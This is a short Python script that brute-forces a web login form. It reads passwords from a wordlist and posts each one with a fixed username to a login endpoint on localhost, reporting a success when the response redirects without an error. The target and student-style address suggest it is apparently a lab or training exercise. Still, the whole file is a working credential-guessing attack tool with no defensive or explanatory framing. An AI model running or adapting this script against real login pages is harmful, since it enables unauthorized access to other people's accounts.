import requests

URL = "http://localhost:4942/login"
USERNAME = "jdoe@student.42.tech"
WORDLIST = "passwords.txt"

 
with open(WORDLIST, "r", errors="ignore") as f:
    passwords = [line.strip() for line in f if line.strip()]
 
print(f"[*] {len(passwords)} passwords")
 
for i, password in enumerate(passwords):
    r = requests.post(URL, data={"identity": USERNAME, "password": password}, allow_redirects=False)
    location = r.headers.get("Location", "")
    if r.status_code in (200, 302, 303) and "error" not in location:
        print(f"[SUCCESS] {password!r} -> {r.status_code} {location}")
        break
    else:
        print(f"[{i+1}/{len(passwords)}] fail: {password!r}")
 